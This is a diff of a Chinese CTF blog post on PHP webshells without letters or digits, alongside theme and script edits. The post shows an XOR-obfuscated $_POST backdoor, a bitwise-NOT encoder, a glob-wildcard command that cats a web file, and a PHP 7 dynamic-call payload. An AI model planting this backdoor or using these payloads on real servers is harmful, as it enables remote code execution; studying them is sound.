-<li>异或<br>这个方法很常见，但是自己还没在实际比赛中用到过……<br>一个非数字字母的后门<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$__=(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"."</span>^<span class="string">"~"</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"|"</span>^<span class="string">"/"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br></pre></td></tr></table></figure>
+<li>异或<br>这个方法很常见，但是自己还没在实际比赛中用到过……<br>一个非数字字母的后门<pre><code class="php">&lt;?php
+ @$_++; // $_ = 1
+ $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _
+ $__.=(&quot;.&quot;^&quot;~&quot;); // _P
+ $__.=(&quot;/&quot;^&quot;`&quot;); // _PO
+ $__.=(&quot;|&quot;^&quot;/&quot;); // _POS
+ $__.=(&quot;{&quot;^&quot;/&quot;); // _POST 
+ ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
+?&gt;
+$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);</code></pre>
 其实异或就是字符的ascii转二进制异或后再转ascii转字符串。</li>
 </ol>
 <p>2.取反<br>能异或就能取反。位运算牛b。比如p牛的这个例子：<br><code>&#39;和&#39;{2}</code>的结果<code>&quot;\x8c&quot;</code>取反是<code>s</code><br>这里还利用了php中数组可以使用<code>{}</code>替换<code>[]</code>的性质。<br>“和”的第三个字节的值为140[0x8c]，取反的值为-141。<br>负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(shell)</span>:</span></span><br><span class="line">        hexbit=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: hex(~(-(<span class="number">256</span>-ord(x)))),shell))</span><br><span class="line">       print(hexbit)</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span>(~(<span class="string">"\x8f\x97\x8f\x96\x91\x99\x90"</span>));</span><br><span class="line">phpinfo</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">def get(shell):
+        hexbit=&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))
+       print(hexbit)</code></pre>
+<pre><code class="php">php &gt; echo(~(&quot;\x8f\x97\x8f\x96\x91\x99\x90&quot;));
+phpinfo</code></pre>
 <p>3.自增运算符<br>自增运算符构造数字也是技巧</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_++;</span><br><span class="line"><span class="keyword">print</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+$_++;
+print($_);
+?&gt;</code></pre>
 <p><code>$_=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</code>也是可以得到<code>2</code>的。这点还可以构造数组键值。</p>
 <p>4.短标签+通配符</p>
 <p>之前在ciscn中遇到过。一个<code>&lt;?php?&gt;</code>算是php的长标签，而<code>&lt;?=?&gt;</code>算短标签。但是这样就可以执行函数了，而且可以通过fuzz达到任意命令执行的效果。由于linux中可以用<code>?</code>来进行单个字母的匹配：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=<span class="variable">$_</span>?&gt;</span><br><span class="line">/bin/cat /var/www/html/index.php</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;
+/bin/cat /var/www/html/index.php</code></pre>
 <p>实际上是应用了linux的glob通配符的作用。既然<code>`</code>可以内联执行。只要能匹配完全就可以达到写shell命令执行的效果。<br>当然，符合匹配结果的命令可能有多个。我们可以加上其他通配符</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[^x] 表示这个位置不是字符x</span><br><span class="line">[0-9] 表示数字范围</span><br><span class="line">[@-[]表示大写字母</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">[^x] 表示这个位置不是字符x
+[0-9] 表示数字范围
+[@-[]表示大写字母</code></pre>
 <p>假如匹配到，我们就可以任意命令执行了。</p>
 <p>5.php7 动态函数 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">&#x2F;&#x2F;phpinfo()</span><br></pre></td></tr></table></figure>
-<p>php7就支持使用<code>($a)();</code>这样的方法来执行动态函数的</p>
+<pre><code>(~%8F%97%8F%96%91%99%90)();
+//phpinfo()</code></pre><p>php7就支持使用<code>($a)();</code>这样的方法来执行动态函数的</p>
 <p>暂且写这么多吧。毕竟php的奇妙之处太多了，一时半会是总结不完的。<br>这周末就是第一次以X1c的队员身份打比赛了，要加油啊。</p>
 <p>参考文章：</p>
 <p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
@@ -799,7 +872,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -811,9 +884,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -946,6 +1019,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1159,7 +1234,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1215,6 +1290,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
